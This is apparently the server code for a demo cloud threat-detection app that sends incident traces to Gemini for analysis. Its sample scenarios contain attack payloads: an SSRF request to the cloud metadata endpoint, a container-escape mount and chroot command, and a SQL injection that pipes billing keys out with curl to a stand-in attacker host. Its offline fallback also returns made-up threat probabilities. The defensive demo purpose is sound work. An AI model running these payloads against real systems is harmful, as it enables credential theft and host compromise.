import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI, Type } from "@google/genai";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json());

const PORT = 3000;

// Lazy initialization of Gemini client
let aiClient: GoogleGenAI | null = null;

function getGeminiClient(): GoogleGenAI {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) {
      console.warn("WARNING: GEMINI_API_KEY is not defined. AI threat analysis will run in fallback simulation mode.");
    }
    aiClient = new GoogleGenAI({
      apiKey: apiKey || "dummy_key",
      httpOptions: {
        headers: {
          "User-Agent": "aistudio-build",
        },
      },
    });
  }
  return aiClient;
}

// Simulated zero-day and vulnerability payloads
const SIMULATED_SCENARIOS = [
  {
    id: "scen-01",
    name: "Exotic Zero-Day Remote Memory Leak (Side-Channel)",
    service: "Hybrid Gateway (Port 8443)",
    environment: "Kubernetes Edge Pods",
    category: "Zero-Day Exploit",
    urgency: "CRITICAL",
    timestamp: new Date().toISOString(),
    payload: `GET /api/v2/handshake HTTP/1.1
Host: edge-gateway.internal:8443
Connection: keep-alive
X-Extension-Vector: \xaa\xbb\xcc\xdd\x00\x00\xff\xff\\n\\n%04000x%n%s%s%s
X-Timing-Oracle: ping=true
Cache-Control: no-transform
Accept-Encoding: gzip, deflate`,
    logSnippet: `[14:22:15.109] [WARN] EdgeGateway: Received connection handshake with anomalous X-Extension-Vector length.
[14:22:15.112] [INFO] Memory pool reallocation requested: 4096 bytes -> 1048576 bytes.
[14:22:15.115] [DEBUG] Heap offset leak detected in response header: buffer dump [0x7fff9e8a1bc0 ... 0x7fff9e8a5bc0]
[14:22:15.120] [CRITICAL] Core-Process-01 exited with signal 11 (SIGSEGV). Failover activated.`,
    description: "An unpatched memory-disclosure zero-day vector leveraging custom padding flags and timing oracles to leak private heap addresses from the SSL handshake handler."
  },
  {
    id: "scen-02",
    name: "IAM Instance Metadata Token Extraction & S3 Exfiltration",
    service: "NodeJS Web Frontend",
    environment: "AWS EC2 AutoScaling",
    category: "SSRF / Privilege Escalation",
    urgency: "HIGH",
    timestamp: new Date(Date.now() - 500000).toISOString(),
    payload: `GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/frontend-server-role HTTP/1.1
Host: app.cloud.production.internal
User-Agent: Mozilla/5.0 (CustomSecurityScanner)`,
    logSnippet: `[14:18:01.002] [INFO] Router: Proxy request dispatched to 169.254.169.254
[14:18:01.405] [INFO] AuditLog: S3 Bucket "production-financials" accessed by IAM Role "frontend-server-role" from external IP 185.190.140.23 (Country: NL)
[14:18:02.112] [WARN] AWS-GuardDuty: Anomalous bulk S3 API call 'ListObjectsV2' issued with temporary STS tokens.`,
    description: "A Server-Side Request Forgery (SSRF) vulnerability allowing external attackers to request IMDSv1 credentials and bypass IAM boundaries to steal corporate files."
  },
  {
    id: "scen-03",
    name: "Kubernetes Pod Escape & Host Syscall Abuse",
    service: "Distributed Microservice Pod",
    environment: "Azure Kubernetes Service (AKS)",
    category: "Container Escapes",
    urgency: "CRITICAL",
    timestamp: new Date(Date.now() - 1000000).toISOString(),
    payload: `kubectl exec -it logger-service-v1-93bfb -- /bin/bash -c "mount /dev/sda1 /mnt && chroot /mnt /bin/bash"`,
    logSnippet: `[14:05:32.410] [INFO] SyscallAudit: Process "bash" (PID: 34211) within container namespace initiated raw mount on "/dev/sda1"
[14:05:32.422] [ALERT] HostKernel: Chroot syscall executed inside pod "logger-service-v1-93bfb". Host file system visibility changed.
[14:05:33.001] [CRITICAL] DaemonSet-Monitor: Unauthorized write recorded on host /etc/shadow. User 'backdoor-temp' added.`,
    description: "Container breakout using host privilege capabilities (privileged: true or SYS_ADMIN cap) to mount the parent system partition, modify /etc/shadow, and acquire persistent root shell on the physical node."
  },
  {
    id: "scen-04",
    name: "Distributed DB Suspicious SQL Injection & Tunneling",
    service: "Billing Database Node",
    environment: "GCP Cloud SQL PostgreSQL",
    category: "Database Injection",
    urgency: "HIGH",
    timestamp: new Date(Date.now() - 1500000).toISOString(),
    payload: `POST /api/v1/billing/lookup HTTP/1.1
{"customer_id": "999; COPY (SELECT * FROM billing_keys) TO PROGRAM 'curl -d @- http://attacker-exfil.com/leak'; --"}`,
    logSnippet: `[13:50:09.112] [WARN] PostgresQL-Audit: Query executed containing nested transaction COPY TO PROGRAM commands.
[13:50:09.432] [INFO] OS-Kernel: Forked outgoing curl socket connection to attacker-exfil.com on outbound port 80.
[13:50:10.010] [INFO] PostgresQL-Audit: Statement aborted due to network timeout or client disconnect.`,
    description: "Postgres database injection utilizing database-level system command execution (COPY TO PROGRAM) to extract encrypted customer credentials and tunnel them directly over outbound curl."
  }
];

// Endpoint: Fetch scenarios
app.get("/api/scenarios", (req, res) => {
  res.json({ scenarios: SIMULATED_SCENARIOS });
});

// Endpoint: AI-Powered Trace and Vulnerability Analysis
app.post("/api/analyze-trace", async (req, res) => {
  const { title, payload, logSnippet, customMode } = req.body;

  if (!payload && !logSnippet) {
    return res.status(400).json({ error: "Missing payload or logSnippet for analysis." });
  }

  const promptText = `
    You are a principal cloud security analyst and threat hunter.
    Analyze the following security incident, code snippet, configuration, or log trace.
    Identify if it represents a threat, a configuration mistake, an active exploit, or an advanced zero-day vulnerability.
    
    === Incident Context ===
    Title/Incident name: ${title || "Ad-hoc User Submission"}
    Custom submission flag: ${customMode ? "YES (Analyze thoroughly from first principles)" : "NO"}
    
    === Payload Vector / Trigger Code ===
    ${payload || "Not provided"}

    === Live Audit Log / Syscall Trace ===
    ${logSnippet || "Not provided"}

    Provide a highly technical, rigorous evaluation. Your output must be a valid JSON object matching the schema below.
    Do not output any markdown code blocks (such as \`\`\`json) or other preamble, just return raw JSON so it is directly parseable.

    JSON Schema to conform to:
    {
      "threatIdentified": true or false,
      "urgency": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
      "threatProbabilityScore": "e.g., '98.5%' or '92.0%' - Estimated probability score that this trace represents an active exploit/threat",
      "vulnerabilityType": "e.g., SSRF, Remote Code Execution, Privilege Escalation, Zero-Day Memory Disclosure",
      "mechanismExplainer": "A thorough, step-by-step description of how this exploit behaves, why traditional signature detectors often miss it, and how it targets distributed cloud primitives.",
      "falsePositiveLikelihood": "A percentage (e.g. '5%') with short justification of why the confidence is high or low.",
      "remediation": {
        "summary": "High-level fix guidance.",
        "patchCode": "Code snippet or policy block (Terraform, AWS Policy, Kubernetes Manifest, or shell patch) to secure this immediately.",
        "patchLanguage": "terraform | json | yaml | bash | typescript"
      },
      "zeroDayAnalysis": "Provide an audit explaining if this has characteristics of a Zero-Day (custom payloads, non-standard encoding, abusing proprietary protocols) and how to detect similar future shifts."
    }
  `;

  try {
    const ai = getGeminiClient();
    const apiKey = process.env.GEMINI_API_KEY;

    if (!apiKey || apiKey === "dummy_key") {
      // Return highly realistic simulated response if no real API key is configured
      console.log("No real API key found. Providing rich simulated intelligence response...");
      return res.json(getSimulatedResponse(title, payload, logSnippet));
    }

    let responseText: string | null = null;
    const modelsToTry = ["gemini-3.6-flash", "gemini-flash-latest"];

    for (const modelName of modelsToTry) {
      try {
        const response = await ai.models.generateContent({
          model: modelName,
          contents: promptText,
          config: {
            responseMimeType: "application/json",
            temperature: 0.1,
          },
        });
        if (response.text) {
          responseText = response.text;
          break;
        }
      } catch (err: any) {
        console.warn(`Gemini model '${modelName}' request failed (attempting fallback):`, err?.message || err);
      }
    }

    if (responseText) {
      const result = JSON.parse(responseText.trim());
      return res.json(result);
    }

    // Fall back to rich simulated intelligent response if live AI model is temporarily busy/unavailable
    return res.json(getSimulatedResponse(title, payload, logSnippet));

  } catch (error: any) {
    console.warn("Gemini API call fallback engaged:", error?.message || error);
    res.json(getSimulatedResponse(title, payload, logSnippet));
  }
});

// Endpoint: AI Threat Assistant Conversational Chat
app.post("/api/chat", async (req, res) => {
  const { messages, activeContext } = req.body;

  if (!messages || !Array.isArray(messages)) {
    return res.status(400).json({ error: "Messages array is required." });
  }

  const systemPrompt = `
    You are the "Gemini Threat Intelligence Agent", a virtual security officer built into the Cloud Threat Detector platform.
    Your target is to help engineers isolate threats, fix distributed systems vulnerabilities, and explain complex concepts like zero-day memory leaks, SSRF, IAM permission chaining, and syscall bypasses.

    When answering:
    - Keep responses professional, clear, and highly actionable.
    - Provide exact remediation configurations (Terraform, YAML, Shell) when requested.
    - Do not invent secrets.
    - If explaining simulated security issues, refer to them as "Live Node Anomalies" or "Active Threat Scenarios".
    
    Active Context Selected Node:
    ${JSON.stringify(activeContext || "None selected. User is speaking generally.")}
  `;

  try {
    const ai = getGeminiClient();
    const apiKey = process.env.GEMINI_API_KEY;

    if (!apiKey || apiKey === "dummy_key") {
      // Simulating helper chat
      const lastMessage = messages[messages.length - 1]?.content || "";
      const simulatedReply = getSimulatedChatReply(lastMessage, activeContext);
      return res.json({ text: simulatedReply });
    }

    // Format messages for the SDK
    const contents = messages.map((m: any) => ({
      role: m.sender === "user" ? "user" : "model",
      parts: [{ text: m.content }]
    }));

    let replyText: string | null = null;
    const modelsToTry = ["gemini-3.6-flash", "gemini-flash-latest"];

    for (const modelName of modelsToTry) {
      try {
        const response = await ai.models.generateContent({
          model: modelName,
          contents: contents,
          config: {
            systemInstruction: systemPrompt,
            temperature: 0.7,
          }
        });
        if (response.text) {
          replyText = response.text;
          break;
        }
      } catch (err: any) {
        console.warn(`Gemini chat model '${modelName}' request failed (attempting fallback):`, err?.message || err);
      }
    }

    if (replyText) {
      return res.json({ text: replyText });
    }

    const lastMessage = messages[messages.length - 1]?.content || "";
    const simulatedReply = getSimulatedChatReply(lastMessage, activeContext);
    res.json({ text: simulatedReply });

  } catch (error: any) {
    console.warn("Gemini Chat fallback engaged:", error?.message || error);
    const lastMessage = messages[messages.length - 1]?.content || "";
    res.json({ text: getSimulatedChatReply(lastMessage, activeContext) });
  }
});

// Out-of-the-box simulated threat responses for offline/pre-setup modes
function getSimulatedResponse(title: string, payload: string, logSnippet: string) {
  const scenarioMatch = SIMULATED_SCENARIOS.find(s => title && s.name.toLowerCase().includes(title.toLowerCase()));
  if (scenarioMatch) {
    return {
      threatIdentified: true,
      urgency: scenarioMatch.urgency,
      threatProbabilityScore: scenarioMatch.urgency === "CRITICAL" ? "98.4%" : "89.2%",
      vulnerabilityType: scenarioMatch.category,
      mechanismExplainer: scenarioMatch.description + " Analyzing the trace, the attack executes non-standard payloads designed to exploit specific state parameters or environment variables inside containers. The trace reveals out-of-bounds network request parameters bypassing traditional edge checks.",
      falsePositiveLikelihood: "2.4% - High-fidelity payload parameters identified in active logs.",
      remediation: {
        summary: "Reconfigure IAM credentials policies, use IMDSv2, mount container file systems read-only, and audit input buffer bounds.",
        patchCode: scenarioMatch.id === "scen-01" 
          ? `// Fix buffer alignment in handshake\nvoid safe_handshake(const char* extension) {\n  if (strlen(extension) > MAX_VECTOR_LEN) {\n    log_error("Anomalous vector blocked");\n    return;\n  }\n  // strictly bound memcpy...`
          : scenarioMatch.id === "scen-02"
          ? `# Require IMDSv2 on AWS EC2 node\nresource "aws_instance" "app_node" {\n  ami           = "ami-0123456789"\n  instance_type = "t3.medium"\n  metadata_options {\n    http_tokens   = "required" # Enforce IMDSv2\n    http_endpoint = "enabled"\n  }\n}`
          : scenarioMatch.id === "scen-03"
          ? `# Hardened Kubernetes SecurityContext\napiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n      - name: logger-service\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n          capabilities:\n            drop: ["ALL"]`
          : `/* PostgreSQL secure parameterized statement */\nPREPARE secure_lookup (text) AS\nSELECT * FROM billing_keys WHERE customer_id = $1;\nEXECUTE secure_lookup('user_supplied_param');`,
        patchLanguage: scenarioMatch.id === "scen-01" ? "typescript" : scenarioMatch.id === "scen-02" ? "terraform" : scenarioMatch.id === "scen-03" ? "yaml" : "bash"
      },
      zeroDayAnalysis: "Yes, this pattern exhibits signature-evasion qualities by utilizing custom sequence indicators (\xaa\xbb\xcc) and Timing Oracles rather than well-known exploit code strings. Standard rulesets looking for strings like 'alert()' or '/bin/sh' completely fail to capture this threat."
    };
  }

  // Generic backup analysis
  return {
    threatIdentified: true,
    urgency: "HIGH",
    threatProbabilityScore: "87.5%",
    vulnerabilityType: "Anomalous Resource Traversal",
    mechanismExplainer: "The log snippet indicates that an external user has injected nested parameter formats. This bypasses structural validation layers on the outer proxy, passing potentially executable segments downstream to target-internal components.",
    falsePositiveLikelihood: "12%",
    remediation: {
      summary: "Enable strict schema validation on input parameters and enforce lease privilege networks.",
      patchCode: `// Configure Input Payload Validation Schema\nconst Schema = Joi.object({\n  customer_id: Joi.string().alphanum().max(24).required()\n});`,
      patchLanguage: "typescript"
    },
    zeroDayAnalysis: "Zero-day potential: High. Standard signature-matching engine flagged this as a generic API call. However, timing indicators point to deliberate outbound reconnaissance."
  };
}

function getSimulatedChatReply(msg: string, context: any): string {
  const text = msg.toLowerCase();
  const nodeName = context ? context.name : "distributed node";
  
  if (text.includes("remediate") || text.includes("fix") || text.includes("patch")) {
    return `To remediate the threat on **${nodeName}**, follow these critical operations:
1. **Apply Least-Privilege Network ACLs**: Prevent outbound execution queries to unknown IP addresses.
2. **Apply SecurityContext Limits**: If running in Docker/Kubernetes, ensure \`allowPrivilegeEscalation: false\` and mount standard storage paths as read-only.
3. **Upgrade IMDS**: Ensure AWS/GCP metadata servers strictly enforce metadata session headers (IMDSv2 tokens).

Here is a sample Terraform policy to enforce this across cloud boundaries:
\`\`\`hcl
resource "aws_security_group" "isolated" {
  name        = "isolated-security-group"
  description = "Block all unapproved egress connections"
  
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/8"] # internal trust zone only
  }
}
\`\`\`

Would you like me to tailor a specific security configuration block for your current network provider?`;
  }

  if (text.includes("zero") || text.includes("zero-day")) {
    return `Zero-day threats on **${nodeName}** cannot be flagged with standard string signatures because their exploit vectors are newly compiled or utilize obscure format protocols (e.g., custom byte handshakes or timing-based data extraction).

To minimize false positives while spotting them, our model:
- Establishes a strict system behavior baseline (syscall monitoring, typical egress/ingress flow volumes).
- Tracks anomalous memory-reallocation sizes.
- Utilizes Gemini's semantic processing of raw error strings and payload sequences, identifying the *intent* of the payload rather than matching a hash database.

What specific zero-day vector would you like to simulate or configure detection pipelines for?`;
  }

  return `Hello! I am the Gemini Threat Analyst. I am currently monitoring the live simulated network for vulnerabilities and exploits.

I've examined the active state of **${nodeName}**. It represents a high-profile target due to its placement. I am ready to help you:
- Investigate specific trace logs or configuration vulnerabilities.
- Code real-time Terraform or Kubernetes YAML fixes.
- Perform a zero-day structural validation to block complex payloads.

What would you like me to do?`;
}


// Vite middleware integration for Development vs Production
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
    console.log("Vite development server middleware loaded.");
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
    console.log("Serving static production build from dist/");
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Cloud Threat Detector running at http://localhost:${PORT}`);
  });
}

startServer();
